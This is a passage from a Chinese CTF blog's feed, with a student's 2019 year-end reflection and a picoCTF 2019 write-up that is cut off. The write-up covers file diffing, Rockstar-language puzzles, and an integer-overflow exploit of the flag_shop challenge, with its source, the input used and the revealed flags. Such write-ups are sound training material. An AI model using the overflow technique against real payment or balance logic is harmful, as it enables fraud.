    &lt;embed src=&quot;GXYCTF_writeup_Mini_Ginkgo.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pd
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分)</title>
    <link href="https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA-%E7%AE%80%E5%8D%95%E9%83%A8%E5%88%86/"/>
    <id>https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA-%E7%AE%80%E5%8D%95%E9%83%A8%E5%88%86/</id>
    <published>2020-01-02T13:26:11.000Z</published>
    <updated>2020-01-03T13:22:24.502Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;applicatio
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XCTF攻防世界刷题(WEB部分)(新手区)</title>
    <link href="https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
    <id>https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E6%96%B0%E6%89%8B%E5%8C%BA/</id>
    <published>2020-01-02T13:22:45.000Z</published>
    <updated>2020-01-03T13:22:13.663Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="XCTF攻防世界刷题(WEB部分)(新手区).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;XCTF攻防世界刷题(WEB部分)(新手区).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019 wp</title>
    <link href="https://www.damyahome.github.io/NCTF2019-wp/"/>
    <id>https://www.damyahome.github.io/NCTF2019-wp/</id>
    <published>2020-01-02T11:17:31.000Z</published>
    <updated>2020-01-03T13:22:18.397Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="NCTF2019_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;NCTF2019_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2019年终总结</title>
    <link href="https://www.damyahome.github.io/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-02T10:47:44.000Z</published>
    <updated>2020-01-02T13:29:48.818Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Damya-2019年终总结"><a href="#Damya-2019年终总结" class="headerlink" title="Damya 2019年终总结"></a>Damya 2019年终总结</h1><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019年是我大一下和大二上的阶段学习时间，这一年对于我而言有打击也有改变。</p><p>大一下发生了很多事，一起在实验室里学习的同级伙伴，我看着他们三三两两地自愿退出了实验室，心底的理由大多是“实验室活太多耽误自己的学习”，又在某人的诱导下，产生了“在哪学不是学，没必要呆在实验室里”的想法。在他们走后也来了些新的伙伴，他们也学得很认真，但也和我一样，没通过学长布置的学期末的考核，丧失了学习信心，过早离开了实验室。我记得那天，学长们发了很大的脾气，我们都将离开这个已经有些依赖感的地方，有些是真的离开，有些是像我这样死皮赖脸想继续学习。仅存的是和我一起的男朋友，他给学长们带来过很大的麻烦，同时我们的办公室恋情也影响了各自的学习，在大二上时他也退出了实验室，我对学长这一年的照顾感到很抱歉。人各有志，我理解他们的想法，但我没法像他们一样，在我敲前端代码时，我的心里也一直在催促我要搞安全，因为喜欢搞安全我才能坚持下去，学习到东西，帮上学长的忙。</p><p>我在大一阶段只是一个辣鸡前端手，我写代码很慢，悟性也不是很高，只会改改模板的水平，老队长在我第一次经验分享时就质疑过我的水平，质疑我是不是有人帮才进的实验室，我当时非常的害怕，自闭学习了好一阵子，因为我的实力严重跟不上大部队，于是就放养了，也许那个时候的学长心里也认为我会退实验室吧。我在大一上时什么比赛的ctf题都做不了，在大一下时，我看了卓哥出去宣讲，我才知道其实是有刷题平台的。于是我就开始刷题，从misc开始，crypto，web，我能做的都尽量去做，不会做的就看wp，记录下做题过程，我的markdown是男朋友强制我去学的，然后为了写mdwriteup，我搭了hexo。在我磕磕绊绊搭好后发的第一篇文章是3月26日，之后每个月都至少会发表一些文章用来记录我的学习过程，有学习经验、遇到的坑、刷题wp等。从大一下开始，我打比赛时可以做一些misc题了。但是这个阶段只懂套路不懂原理，所以光刷题并没有多大用，在期末考核时也有种使不上力的无力感。</p><p>我刚进实验室时就很崇拜涛哥，现在依旧很崇拜，他帮助了我很多很多，也给了我很多启发，在写脚本和思维上，他疏导了我很多的僵化思想。然后是卓哥，他很懂得教人，也很体谅我身体差，也很包容我，我经常会去视奸他博客学习。万学长我接触的不多，觉得人很可爱，在去合肥那次才感受到他的强大，站一日一个准。因为被崔学长骂过，有点怕他，只敢视奸他博客。对郭哲学长的印象就是什么题他都能做出来，非常稳。周哥和吴师傅人也特别好，都不怎么骂人，浩哥虽然经常神龙见首不见尾，但是人也非常好，学长们的技术都特别强，有很多需要学习的地方和经验。</p><p>大二上期间，因为断层了，我意外获得了一些能出去比赛的经验，但我实际上上场打过的只有实验室队内赛、第一届应急响应杯、一个人的国赛、今年的实验室队内赛共四场AWD，我的经验依旧不够用。大二上我开始自己学web和渗透了，也逐渐会写一些小脚本，别人的脚本也会改会用，也学了一些网站框架，我想学我自己喜欢的知识，并巩固原理，所以放慢了刷题速度并提高质量和类型。大二上时期，来了新队友和大一的学弟学妹，感觉实验室又热闹起来了，挺好的，最重要的是终于不是我在孤身奋战了，有人分担压力的感觉真的很好。但我依旧学的很慢，直到现在还有点难跟上卓哥大二时的水平，我希望新的一年不奢求能成为队友的后背，先能够成为队友的臂膀吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Damya-2019年终总结&quot;&gt;&lt;a href=&quot;#Damya-2019年终总结&quot; class=&quot;headerlink&quot; title=&quot;Damya 2019年终总结&quot;&gt;&lt;/a&gt;Damya 2019年终总结&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
      <category term="日常" scheme="https://www.damyahome.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="年终总结" scheme="https://www.damyahome.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2019picoCTF补充wp(10050分记录)</title>
    <link href="https://www.damyahome.github.io/2019picoCTF%E8%A1%A5%E5%85%85wp-10050%E5%88%86%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.damyahome.github.io/2019picoCTF%E8%A1%A5%E5%85%85wp-10050%E5%88%86%E8%AE%B0%E5%BD%95/</id>
    <published>2019-12-04T12:34:49.000Z</published>
    <updated>2019-12-04T13:30:22.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一般技能-General-Skills"><a href="#一般技能-General-Skills" class="headerlink" title="一般技能(General Skills)"></a>一般技能(General Skills)</h1><h2 id="whats-the-difference-Points-200"><a href="#whats-the-difference-Points-200" class="headerlink" title="whats-the-difference - Points: 200"></a>whats-the-difference - Points: 200</h2><blockquote><p>Can you spot the difference? kitters cattos. They are also available at /problems/whats-the-difference_0_00862749a2aeb45993f36cc9cf98a47a on the shell server<br>Hints: How do you find the difference between two files?<br>Dumping the data from a hex editor may make it easier to compare.</p></blockquote><p>这题我完全没有思路,看了github 上ajolliet师傅的wp发现自己学到了很多</p><p>以下是解题过程:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C kitters.jpg &gt; kittersfile</span><br><span class="line">hexdump -C cattos.jpg &gt; cattosfile</span><br><span class="line">diff -c kittersfile cattosfile | grep <span class="string">"^!"</span></span><br></pre></td></tr></table></figure><p>使用diff命令能很快的比较出两个文件的不同,<code>grep &quot;^!&quot;</code>能把不同的行数行在一起进行对比,于是将不同的地方放在一起比较,提取字符就能得到flag(数据太长就不贴出来了)<br>picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</p><h2 id="flag-shop-Points-300"><a href="#flag-shop-Points-300" class="headerlink" title="flag_shop - Points: 300"></a>flag_shop - Points: 300</h2><blockquote><p>There’s a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.<br>Hints: Two’s compliment can do some weird things when numbers get really big!</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the flag exchange\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"We sell flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n1. Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n2. Buy Flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n3. Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Currently for sale\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1. Defintely not the flag Flag\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2. 1337 Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"These knockoff Flags cost 900 each, enter desired quantity\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">900</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nThe final cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds to complete purchase\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"1337 flags cost 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to buy one"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        FILE *f = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">                        <span class="keyword">if</span>(f == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"flag not found: please run this on the server\n"</span>);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">                        fgets(buf, <span class="number">63</span>, f);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS: %s\n"</span>, buf);</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个商店系统实现的功能有进货劣质品和购买真品,但在代码中存在一个漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">account_balance = account_balance - total_cost;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当<code>account_balance - total_cost</code>为负数时,他的值会变成正数赋给<code>account_balance</code>,将会使你的账户余额增加,而购买一件劣质品成本需要900块,所以只要使你的进货成本比售价高,就有足够的钱买1337个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 14937</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">1</span><br><span class="line">These knockoff Flags cost 900 each, enter desired quantity</span><br><span class="line">2147468647</span><br><span class="line">The final cost is: -13500900</span><br><span class="line">Your current balance after transaction: 13502000</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">2</span><br><span class="line">1337 flags cost 100000 dollars, and we only have 1 in stock</span><br><span class="line">Enter 1 to buy one1</span><br><span class="line">YOUR FLAG IS: picoCTF&#123;m0n3y_bag5_e062f0fd&#125;</span><br></pre></td></tr></table></figure></p><p>picoCTF{m0n3y_bag5_e062f0fd}</p><h2 id="mus1c-Points-300"><a href="#mus1c-Points-300" class="headerlink" title="mus1c - Points: 300"></a>mus1c - Points: 300</h2><blockquote><p>I wrote you a song. Put it in the picoCTF{} flag format<br>Hints: Do you think you can master rockstar?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Pico&apos;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&apos;s waitin</span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">My song&apos;s something</span><br><span class="line">put Pico into This</span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line">shout my lyric</span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line">shout my lyric</span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line">build it up</span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure><p>这道题和NCTF的某题很像,可以用这个网址解密 <a href="https://codewithrockstar.com/" target="_blank" rel="noopener">https://codewithrockstar.com/</a><br><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>将ascil码转成文本,得到flag</p><p>picoCTF{rrrocknrn0113r}</p><h2 id="1-wanna-b3-a-r0ck5tar-Points-350"><a href="#1-wanna-b3-a-r0ck5tar-Points-350" class="headerlink" title="1_wanna_b3_a_r0ck5tar - Points: 350"></a>1_wanna_b3_a_r0ck5tar - Points: 350</h2><blockquote><p>I wrote you another song. Put the flag in the picoCTF{} flag format</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string        </span><br><span class="line">Tommy&apos;s been down               </span><br><span class="line">Music is a billboard-burning razzmatazz!</span><br><span class="line">Listen to the music             </span><br><span class="line">If the music is a guitar                  </span><br><span class="line">Say &quot;Keep on rocking!&quot;                </span><br><span class="line">Listen to the rhythm</span><br><span class="line">If the rhythm without Music is nothing</span><br><span class="line">Tommy is rockin guitar</span><br><span class="line">Shout Tommy!                    </span><br><span class="line">Music is amazing sensation </span><br><span class="line">Jamming is awesome presence</span><br><span class="line">Scream Music!                   </span><br><span class="line">Scream Jamming!                 </span><br><span class="line">Tommy is playing rock           </span><br><span class="line">Scream Tommy!       </span><br><span class="line">They are dazzled audiences                  </span><br><span class="line">Shout it!</span><br><span class="line">Rock is electric heaven                     </span><br><span class="line">Scream it!</span><br><span class="line">Tommy is jukebox god            </span><br><span class="line">Say it!                                     </span><br><span class="line">Break it down</span><br><span class="line">Shout &quot;Bring on the rock!&quot;</span><br><span class="line">Else Whisper &quot;That ain&apos;t it, Chief&quot;                 </span><br><span class="line">Break it down</span><br></pre></td></tr></table></figure><p>跟着github看了一通rockstar语言,长见识了,然后决定使用rockstar-py工具,将rock文件转换成python语言(只支持python3运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -W ignore -m rockstarpy lyrics2.rock</span><br></pre></td></tr></table></figure></p><p>转换后的文本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll = <span class="literal">True</span></span><br><span class="line">Silence = <span class="literal">False</span></span><br><span class="line">a_guitar = <span class="number">19</span></span><br><span class="line">Tommy = <span class="number">44</span></span><br><span class="line">Music = <span class="number">160</span></span><br><span class="line">the_music = input()</span><br><span class="line"><span class="keyword">if</span> the_music == a_guitar:</span><br><span class="line">    print(<span class="string">"Keep on rocking!"</span>)</span><br><span class="line">    the_rhythm = input()</span><br><span class="line">    <span class="keyword">if</span> the_rhythm - Music == <span class="literal">False</span>:</span><br><span class="line">        Tommy = <span class="number">66</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        Music = <span class="number">79</span></span><br><span class="line">        Jamming = <span class="number">78</span></span><br><span class="line">        print(Music!)</span><br><span class="line">        print(Jamming!)</span><br><span class="line">        Tommy = <span class="number">74</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        They are dazzled audiences</span><br><span class="line">        print(it!)</span><br><span class="line">        Rock = <span class="number">86</span></span><br><span class="line">        print(it!)</span><br><span class="line">        Tommy = <span class="number">73</span></span><br><span class="line">        print(it!)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"Bring on the rock!"</span>)</span><br><span class="line">        Else print(<span class="string">"That ain't it, Chief"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>再将ascil码转换成字符<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = [<span class="number">66</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">74</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">73</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;&#123;&#123;&#125;&#125;&#125;'</span>.format(<span class="string">''</span>.join(map(chr, r)))</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{BONJOVI}</p><h1 id="密码学-Cryptography"><a href="#密码学-Cryptography" class="headerlink" title="密码学(Cryptography)"></a>密码学(Cryptography)</h1><h2 id="Mr-Worldwide-Points-200"><a href="#Mr-Worldwide-Points-200" class="headerlink" 